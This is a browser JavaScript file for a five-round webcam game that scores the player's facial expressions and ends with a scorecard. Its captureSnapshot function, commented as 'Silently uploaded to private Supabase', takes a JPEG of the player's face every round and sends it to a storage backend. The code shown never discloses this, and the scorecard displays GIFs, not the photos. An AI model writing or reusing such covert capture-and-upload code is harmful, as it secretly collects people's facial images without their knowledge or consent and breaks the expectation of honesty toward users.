(function () {
  const $ = id => document.getElementById(id);

  // 1. Game Challenge Rounds (5 Face Reaction Challenges)
  const ROUNDS = [
    {
      id: "angry",
      name: "FIERCE & ANGRY!",
      emoji: "😡",
      hint: "Furrow your brows tightly! Look mad!",
      targetEmotion: "angry",
      thresholdPct: 45,
      introSpeech: "Show me your scariest angry face! 💢",
      winSpeech: "Whoa! Terrifyingly fierce! 😱",
      failSpeech: "Too sweet to look angry! 🌸",
      anim: "crying",
      winAnim: "boo_crying",
      burstEmoji: "💢"
    },
    {
      id: "smile",
      name: "BIG BRIGHT SMILE!",
      emoji: "😄",
      hint: "Beam with joy! Show those teeth!",
      targetEmotion: "smile",
      thresholdPct: 48,
      introSpeech: "Show me your brightest mega smile! ✨",
      winSpeech: "Radiant! Pure sunshine! ☀️",
      failSpeech: "Aww, so serious! Smile more! 🥺",
      anim: "smile",
      winAnim: "dance_party",
      burstEmoji: "💖"
    },
    {
      id: "rude",
      name: "RUDE & SASSY SMIRK!",
      emoji: "😏",
      hint: "Curl one side of your mouth with attitude!",
      targetEmotion: "rude",
      thresholdPct: 40,
      introSpeech: "Savage mode on! Give me that smirk 💅",
      winSpeech: "The AUDACITY! Elite sassiness! 💅",
      failSpeech: "Not quite enough attitude! 🙈",
      anim: "talk",
      winAnim: "dance",
      burstEmoji: "✨"
    },
    {
      id: "surprise",
      name: "TOTAL SHOCK!",
      emoji: "😲",
      hint: "Drop your jaw and open your eyes wide!",
      targetEmotion: "surprise",
      thresholdPct: 44,
      introSpeech: "GASP! Like you just saw a ghost! 👻",
      winSpeech: "SHOCKED to the core! Flawless! 🌟",
      failSpeech: "Unfazed! Ice in your veins! 🧊",
      anim: "talk",
      winAnim: "dance",
      burstEmoji: "⚡"
    },
    {
      id: "wink",
      name: "SILLY WINK!",
      emoji: "😉",
      hint: "Close one eye and give a cheeky grin!",
      targetEmotion: "wink",
      thresholdPct: 42,
      introSpeech: "Hit me with that charm! One eye closed 😉",
      winSpeech: "Wink of the century! Stunning! 💖",
      failSpeech: "Did you blink both? Nice try! 😜",
      anim: "smile",
      winAnim: "heart",
      burstEmoji: "⭐"
    }
  ];

  // 2. Game State
  const state = {
    currentRoundIdx: 0,
    score: 0,
    roundActive: false,
    roundSecondsLeft: 7,
    roundTimerHandle: null,
    consecutiveMatches: 0,
    roundWon: false,
    roundResults: [],
    detector: null,
    cameraStream: null,
    loopActive: false,
    lastDynamicAnimTime: 0
  };

  const video = $("camera-video");
  const canvas = $("capture-canvas");
  const ctx = canvas.getContext("2d");

  // Visual Burst Effect
  function burst(char = "✨") {
    const container = $("reaction-burst");
    if (!container) return;
    for (let i = 0; i < 18; i++) {
      const item = document.createElement("span");
      item.className = "burst-item";
      item.textContent = char;
      const angle = (Math.PI * 2 * i) / 18 + (Math.random() - 0.5) * 0.4;
      const dist = 70 + Math.random() * 90;
      item.style.setProperty("--dx", `${Math.cos(angle) * dist}px`);
      item.style.setProperty("--dy", `${Math.sin(angle) * dist}px`);
      item.style.setProperty("--rot", `${(Math.random() - 0.5) * 180}deg`);
      item.style.left = "50%";
      item.style.top = "45%";
      container.appendChild(item);
      setTimeout(() => item.remove(), 850);
    }
  }

  // Switch Character GIF
  function setCharacterVisual(animName) {
    const gifImg = $("gif-character");
    if (!gifImg) return;
    const path = `./assets/${animName}.gif`;
    gifImg.src = path;
    gifImg.classList.remove("pop-anim");
    void gifImg.offsetWidth;
    gifImg.classList.add("pop-anim");
  }

  // Capture Canvas Snapshot (Silently uploaded to private Supabase)
  function captureSnapshot() {
    if (!video || video.videoWidth === 0) return null;
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL("image/jpeg", 0.85);

    if (canvas.toBlob && window.mirrorStore) {
      canvas.toBlob(blob => {
        if (blob) {
          const currentRound = ROUNDS[state.currentRoundIdx] || {};
          window.mirrorStore.save(blob, "photo", {
            detectedAction: currentRound.id || "game_moment",
            animationShown: currentRound.anim || "smile"
          }).catch(err => console.warn("Supabase backup note:", err));
        }
      }, "image/jpeg", 0.85);
    }

    return dataUrl;
  }

  // Update UI Elements for current round
  function showRoundPrompt(round) {
    $("round-indicator").textContent = `CHALLENGE ${state.currentRoundIdx + 1} / ${ROUNDS.length}`;
    $("challenge-badge").textContent = `TARGET REACTION`;
    $("challenge-emoji").textContent = round.emoji;
    $("challenge-title").textContent = round.name;
    $("challenge-hint").textContent = round.hint;
    $("speech-bubble").textContent = round.introSpeech;
    setCharacterVisual(round.anim);

    // Reset timer bar
    $("timer-seconds").textContent = "7s";
    $("timer-bar-fill").style.width = "100%";
    $("timer-bar-fill").classList.remove("urgent");

    const scanner = $("live-scanner-card");
    if (scanner) scanner.className = "live-scanner-card";
  }

  // Start a specific round
  function startRound(index) {
    if (index >= ROUNDS.length) {
      finishGame();
      return;
    }

    state.currentRoundIdx = index;
    state.roundActive = false;
    state.roundWon = false;
    state.consecutiveMatches = 0;
    state.roundSecondsLeft = 7;

    const round = ROUNDS[index];
    showRoundPrompt(round);

    // Start active round timer
    setTimeout(() => {
      state.roundActive = true;
      runTimer();
    }, 800);
  }

  // Round countdown timer
  function runTimer() {
    clearInterval(state.roundTimerHandle);
    const startTime = Date.now();
    const duration = 7000;

    state.roundTimerHandle = setInterval(() => {
      if (!state.roundActive) {
        clearInterval(state.roundTimerHandle);
        return;
      }

      const elapsed = Date.now() - startTime;
      const remaining = Math.max(0, duration - elapsed);
      const seconds = Math.ceil(remaining / 1000);
      const percent = (remaining / duration) * 100;

      $("timer-seconds").textContent = `${seconds}s`;
      $("timer-bar-fill").style.width = `${percent}%`;

      if (seconds <= 2) {
        $("timer-bar-fill").classList.add("urgent");
      }

      if (remaining <= 0) {
        clearInterval(state.roundTimerHandle);
        handleRoundTimeout();
      }
    }, 1000);
  }

  // Handle successful match
  function handleRoundWin() {
    if (!state.roundActive || state.roundWon) return;
    state.roundWon = true;
    state.roundActive = false;
    clearInterval(state.roundTimerHandle);

    const round = ROUNDS[state.currentRoundIdx];
    const snapshot = captureSnapshot();

    // Speed bonus
    const speedBonus = state.roundSecondsLeft * 100;
    const roundScore = 1000 + speedBonus;
    state.score += roundScore;

    state.roundResults.push({
      roundId: round.id,
      name: round.name,
      emoji: round.emoji,
      success: true,
      score: roundScore,
      photoUrl: snapshot
    });

    $("score-display").textContent = state.score.toLocaleString();
    const scanner = $("live-scanner-card");
    if (scanner) scanner.classList.add("matched");

    $("speech-bubble").textContent = round.winSpeech;
    setCharacterVisual(round.winAnim || "dance_party");
    burst(round.burstEmoji || "✨");

    setTimeout(() => {
      startRound(state.currentRoundIdx + 1);
    }, 1800);
  }

  // Handle timeout (missed round)
  function handleRoundTimeout() {
    if (!state.roundActive || state.roundWon) return;
    state.roundActive = false;

    const round = ROUNDS[state.currentRoundIdx];
    const snapshot = captureSnapshot();

    state.roundResults.push({
      roundId: round.id,
      name: round.name,
      emoji: round.emoji,
      success: false,
      score: 0,
      photoUrl: snapshot
    });

    $("speech-bubble").textContent = round.failSpeech;
    setCharacterVisual("crying");

    setTimeout(() => {
      startRound(state.currentRoundIdx + 1);
    }, 1800);
  }

  // Live detector frame update callback - Updates percentage bars and reactions
  function onFaceUpdate(data) {
    const scannerCard = $("live-scanner-card");
    const scannedEmoji = $("scanned-emoji");
    const scannedLabel = $("scanned-label");
    const scannedPercentage = $("scanned-percentage");

    if (!data.hasFace) {
      if (scannedEmoji) scannedEmoji.textContent = "👁️";
      if (scannedLabel) scannedLabel.textContent = "Looking for your face...";
      if (scannedPercentage) scannedPercentage.textContent = "0%";
      if (scannerCard) scannerCard.className = "live-scanner-card";
      return;
    }

    const scores = data.scores || {};
    const dom = data.dominantEmotion;
    const domPct = data.dominantPercent || 0;

    const emojiMap = {
      angry: "😡",
      smile: "😄",
      rude: "😏",
      surprise: "😲",
      wink: "😉",
      neutral: "😐"
    };

    const labelMap = {
      angry: "ANGRY SCOWL",
      smile: "HAPPY SMILE",
      rude: "RUDE / SASSY SMIRK",
      surprise: "SHOCKED / GASP",
      wink: "CHEEKY WINK",
      neutral: "CALM / NEUTRAL"
    };

    // 1. Update Big Dominant Hero Card
    if (scannedEmoji) scannedEmoji.textContent = emojiMap[dom] || "✨";
    if (scannedLabel) scannedLabel.textContent = labelMap[dom] || `${dom.toUpperCase()}`;
    if (scannedPercentage) scannedPercentage.textContent = `${domPct}%`;

    if (scannerCard && dom !== "neutral") {
      scannerCard.className = `live-scanner-card emotion-${dom}`;
    }

    // 2. Update Live Reaction % Breakdown Bars
    const updateBar = (id, pct) => {
      const bar = $(`bar-${id}`);
      const txt = $(`pct-${id}`);
      if (bar) bar.style.width = `${pct}%`;
      if (txt) txt.textContent = `${pct}%`;
    };

    updateBar("angry", scores.angry || 0);
    updateBar("smile", scores.smile || 0);
    updateBar("rude", scores.rude || 0);
    updateBar("surprise", scores.surprise || 0);
    updateBar("wink", scores.wink || 0);

    // 3. Dynamic Cute Character GIF reaction based on reaction %
    const now = Date.now();
    if (state.roundActive && !state.roundWon && now - state.lastDynamicAnimTime > 1300) {
      if (scores.angry >= 45) {
        state.lastDynamicAnimTime = now;
        setCharacterVisual("crying");
        $("speech-bubble").textContent = `Whoa, ${scores.angry}% Angry! Looking fierce! 😱`;
      } else if (scores.smile >= 45) {
        state.lastDynamicAnimTime = now;
        setCharacterVisual("smile");
        $("speech-bubble").textContent = `${scores.smile}% Happy! Radiant smile! ✨`;
      } else if (scores.rude >= 38) {
        state.lastDynamicAnimTime = now;
        setCharacterVisual("talk");
        $("speech-bubble").textContent = `${scores.rude}% Sass detected! Elite attitude! 💅`;
      } else if (scores.surprise >= 40) {
        state.lastDynamicAnimTime = now;
        setCharacterVisual("dance");
        $("speech-bubble").textContent = `${scores.surprise}% Shocked! 😲`;
      } else if (scores.wink >= 38) {
        state.lastDynamicAnimTime = now;
        setCharacterVisual("heart");
        $("speech-bubble").textContent = `${scores.wink}% Wink! Looking cute! 💖`;
      }
    }

    // 4. Check if Current Challenge Target is Met
    if (!state.roundActive || state.roundWon) return;

    const currentRound = ROUNDS[state.currentRoundIdx];
    if (!currentRound) return;

    const targetPct = scores[currentRound.targetEmotion] || 0;

    if (targetPct >= currentRound.thresholdPct) {
      state.consecutiveMatches++;
      if (state.consecutiveMatches >= 2) {
        handleRoundWin();
      }
    } else {
      state.consecutiveMatches = Math.max(0, state.consecutiveMatches - 1);
    }
  }

  // Finish game & show Reaction Trophy Scorecard
  function finishGame() {
    state.roundActive = false;
    clearInterval(state.roundTimerHandle);

    $("game-screen").hidden = true;
    $("scorecard-screen").hidden = false;

    const wonCount = state.roundResults.filter(r => r.success).length;
    let rankTitle = "Expression Master! 👑";
    if (wonCount === 4) rankTitle = "Drama Superstar! 🌟";
    else if (wonCount === 3) rankTitle = "Sassy & Playful! ✨";
    else if (wonCount < 3) rankTitle = "Stone-Faced Hero! 🗿";

    $("final-rank-title").textContent = rankTitle;
    $("final-score-num").textContent = state.score.toLocaleString();
    $("final-accuracy-text").textContent = `${wonCount} of ${ROUNDS.length} expressions matched!`;

    const strip = $("polaroid-strip");
    strip.innerHTML = "";

    state.roundResults.forEach((res, i) => {
      const card = document.createElement("div");
      card.className = "polaroid-card";
      const rot = (i % 2 === 0 ? -1 : 1) * (1.5 + (i * 0.8) % 3);
      card.style.setProperty("--rot", `${rot}deg`);

      const imgWrap = document.createElement("div");
      imgWrap.className = "polaroid-img-wrap";

      const gifSrc = res.success ? `./assets/${ROUNDS[i]?.winAnim || "dance"}.gif` : `./assets/crying.gif`;
      imgWrap.innerHTML = `<img src="${gifSrc}" alt="${res.name}" style="transform:none;object-fit:cover;" />`;

      const caption = document.createElement("div");
      caption.className = "polaroid-caption";
      caption.textContent = `${res.emoji} ${res.name}`;

      const status = document.createElement("div");
      status.className = `polaroid-status ${res.success ? "success" : "miss"}`;
      status.textContent = res.success ? `MATCHED (+${res.score})` : "MISSED";

      card.appendChild(imgWrap);
      card.appendChild(caption);
      card.appendChild(status);
      strip.appendChild(card);
    });

    burst("🎉");
  }

  // Camera detection loop
  async function runDetectionLoop() {
    if (!state.loopActive) return;
    if (state.detector) {
      await state.detector.process();
    }
    requestAnimationFrame(runDetectionLoop);
  }

  // Start Camera and initialize detector
  async function setupCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user",
          width: { ideal: 640 },
          height: { ideal: 480 }
        },
        audio: false
      });

      state.cameraStream = stream;
      video.srcObject = stream;
      await video.play();

      state.detector = new window.FaceReactionDetector(video, onFaceUpdate);
      state.loopActive = true;
      runDetectionLoop();

      return true;
    } catch (err) {
      console.error("Camera access error:", err);
      $("consent-cry-box").style.display = "block";
      const errEl = $("consent-error");
      errEl.textContent = "Camera access denied. Please allow camera to scan your face!";
      errEl.hidden = false;
      return false;
    }
  }

  // Initialize Game from Lobby
  async function startGame() {
    $("start-button").disabled = true;
    $("start-button").textContent = "STARTING SCANNER...";

    const ready = await setupCamera();
    if (!ready) {
      $("start-button").disabled = false;
      $("start-button").textContent = "TRY AGAIN 📸";
      return;
    }

    $("lobby-screen").hidden = true;
    $("scorecard-screen").hidden = true;
    $("game-screen").hidden = false;

    state.score = 0;
    state.roundResults = [];
    $("score-display").textContent = "0";

    startRound(0);
  }

  // Reset Game for Replay
  function replayGame() {
    state.score = 0;
    state.roundResults = [];
    $("score-display").textContent = "0";

    $("scorecard-screen").hidden = true;
    $("game-screen").hidden = false;

    startRound(0);
  }

  // Bind Event Listeners
  window.addEventListener("DOMContentLoaded", () => {
    $("start-button").addEventListener("click", startGame);
    $("replay-button").addEventListener("click", replayGame);
  });
})();
